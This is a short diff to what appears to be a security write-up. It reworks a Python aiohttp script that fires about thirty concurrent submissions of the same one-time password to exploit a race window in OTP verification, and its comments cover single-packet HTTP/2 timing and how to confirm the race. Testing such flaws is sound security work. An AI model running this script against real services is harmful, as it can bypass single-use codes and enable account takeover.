@@ -53,9 +53,14 @@ async def verify(session, otp):
 async def race():
     cookies = {"session": "YOUR_SESSION"}
     async with aiohttp.ClientSession(cookies=cookies) as s:
-        # Send same OTP simultaneously from two browsers
-        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
-        print(results)
+        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
+        # window before the server marks it used. Two requests are NOT enough —
+        # they almost always resolve sequentially as "already-used" (false negative).
+        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
+        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
+        # Race confirmed if >1 success (or 1 success among many "already-used").
+        for status, body in results:
+            print(status, body)
 asyncio.run(race())
 ```
 
